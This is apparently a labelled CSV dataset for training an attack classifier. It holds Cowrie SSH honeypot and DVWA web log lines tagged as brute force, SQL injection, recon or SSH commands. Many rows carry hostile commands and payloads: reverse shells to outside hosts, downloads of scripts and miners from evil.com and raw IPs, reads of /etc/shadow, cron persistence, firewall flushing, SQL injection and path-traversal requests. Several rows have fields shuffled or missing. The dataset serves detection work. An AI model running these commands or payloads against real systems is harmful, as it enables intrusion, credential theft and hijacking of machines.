text,label
source:cowrie event:cowrie.command.input ip:172.16.66.239 username:- password:- command:nmap -sV 192.168.1.0/24 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.164.212.83 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.96.34.32 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:45.22.122.121 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:10.199.74.7 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:103.251.59.110 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.160.117 username:- password:- command:sh /tmp/payload.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.151.109.211 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fpasswd HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:185.111.84.142 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+sleep(3)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.112.1 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.175.151 username:grafana password:welcome command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:203.162.212.168 username:test password:123123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:45.86.113.62 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:45.251.74.167 username:- password:- command:cat ~/.ssh/authorized_keys,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:103.53.89.225 password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+2+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep%285%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:91.134.28.93 username:- password:- command:- request:""GET /dvwa/vulnerabilities/upload/ HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:curl http://evil.com/payload.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.240.20.236 username:gnats password:master command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:172.20.107.161 username:- password:- command:dd if=/dev/zero of=/tmp/fill bs=1M count=500 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.167.212.193 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.250.162.156 username:- password:- command:whoami request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success username:root ip:192.168.244.137 password:princess command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:172.24.51.182 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.57.232.172 username:- password:- command:tar czf /tmp/data.tar.gz /etc /home /var/www request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN username:- command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:103.204.114.72 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:203.184.183.34 username:- password:- command:cat /etc/shadow request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:185.160.19.54 username:- password:- command:- /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:185.114.129.249 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fnet%2ftcp HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.95.36 username:list password:default command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:172.26.131.54 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:103.246.27.61 username:- password:- command:- request:""GET /dvwa/vulnerabilities/csrf/ HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:10.122.20.52 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:172.25.116.119 username:sys password:monkey command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:id request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.135.8.66 username:redis password:root request:-,SSH_SUCCESS-COWRIE
source:cowrie ip:10.131.42.102 event:cowrie.login.failed username:daemon password:changeme command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:45.184.36.48 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:203.73.16.253 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:172.19.67.75 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.227.7.108 username:- password:- command:(crontab -l; echo '*/5 * * * * /tmp/bot.sh') | crontab - request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.190.242.1 username:- password:- command:- request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie ip:10.72.51.43 event:cowrie.login.success username:ftpuser command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:45.160.64.128 username:jenkins password:guest command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:45.8.222.100 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.206.130 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.198.125 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+HAVING+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:172.29.224.94 username:uucp password:test command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:172.23.132.90 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:103.189.29.178 password:- command:- request:""GET /dvwa/robots.txt HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:192.168.186.219 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:203.10.86.60 username:- command:- password:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fpasswd HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:185.69.154.112 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:91.148.185.79 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.239.195.57 username:- password:- command:bash -c 'bash -i >& /dev/tcp/45.33.32.156/1337 0>&1' request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:172.20.124.49 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.74.181.79 username:- password:- command:cat /proc/meminfo request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:10.206.179.109 username:- password:- request:""GET command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:10.192.120.134 username:mail password:guest command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.82.15 username:- password:- command:cat /etc/os-release request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.142.50.44 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:45.252.111.249 username:irc password:password123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:last request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:103.243.226.227 username:- password:- command:./bot.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.14.217.194 username:- password:- command:id request:-,SSH_COMMAND-COWRIE
event:cowrie.command.input source:cowrie ip:192.168.244.137 username:- password:- command:wget request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:91.66.205.152 username:- password:- command:- request:""GET /dvwa/?dvwaSecurityLevel=low HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:172.31.184.21 username:- password:- command:- HTTP/1.1"" request:""GET",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- request:""POST command:- /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:103.121.201.153 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:server command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:45.101.232.135 username:- password:- command:nmap -O 192.168.1.1 request:-,SSH_COMMAND-COWRIE
"source:cowrie event:cowrie.command.input ip:91.222.152.49 username:- password:- command:python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' request:-",SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /etc request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:91.50.164.90 username:list password:admin123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:185.130.202.222 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:recon ip:141.109.69.6 username:- password:- command:- request:-,RECON-COWRIE
source:cowrie event:cowrie.login.success ip:10.216.115.145 username:irc password:P@ssw0rd command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:203.173.125.190 username:- password:- command:rpm -qa request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.185.48.203 username:- password:- command:iptables -X request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.92.3 username:- password:- request:""POST command:- HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:103.150.246.113 username:hadoop password:qwerty123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:103.11.99.164 username:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.250.142.250 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:103.237.181.231 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:172.29.234.161 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ps request:-,SSH_COMMAND-COWRIE
source:cowrie ip:103.154.16.219 event:cowrie.login.success username:user password:sunshine command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:203.150.216.14 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:172.29.162.202 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:91.140.79.212 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.33.102 username:- password:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.229.177 username:- password:- command:bash -c -i >& /dev/tcp/45.33.32.156/1337 0>&1' request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.89.194 username:- password:- command:wget http://45.33.32.156/miner request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:last request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.61.219 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=CONVERT(int,@@version)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:172.25.42.190 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fshadow HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:91.65.75.246 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed password:root ip:45.142.208.75 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:192.168.119.180 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.80.41 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:91.99.198.191 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:185.61.166.125 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:172.27.242.219 username:daemon password:changeme command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:203.181.53.8 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:10.0.186.48 username:rabbitmq password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:185.79.3.173 username:- password:- command:- request:""GET /dvwa/.env HTTP/1.1""",RECON-DVWA
"source:DVWA ip:10.61.168.182 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
event:cowrie.command.input ip:192.168.164.92 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:raspberry command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:10.211.133.41 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:cowrie event:cowrie.command.input ip:203.117.135.41 username:- password:- command:python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' request:-",SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:203.58.133.175 username:mysql password:admin command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:172.19.76.53 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fssh%2fsshd_config HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:45.211.108.91 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:103.78.194.106 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.195.181 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie ip:185.44.151.151 username:deploy password:123abc command:- request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:sudo bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.103.137.130 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.client.version ip:84.247.126.148 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.164.203 username:games password:passw0rd command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie ip:172.24.120.171 username:- password:- command:./xmrig --donate-level 1 -o xmr.pool.minergate.com:45700 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.124.191 username:- password:- command:setenforce 0,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.124.33.164 username:- password:- command:bash -c 'bash -i >& /dev/tcp/45.33.32.156/1337 0>&1' request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:91.173.137.26 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.31.224.209 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:10.125.91.116 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:103.32.214.128 username:lp password:654321 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie ip:45.232.54.214 username:root command:- password:pass@123 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success username:nagios password:password command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.29.93 username:nginx password:1234 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:10.74.48.108 username:- password:- command:kill -9 -1 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.173.112.251 username:- password:- command:tftp -g -r payload 10.0.0.5 request:-,SSH_COMMAND-COWRIE
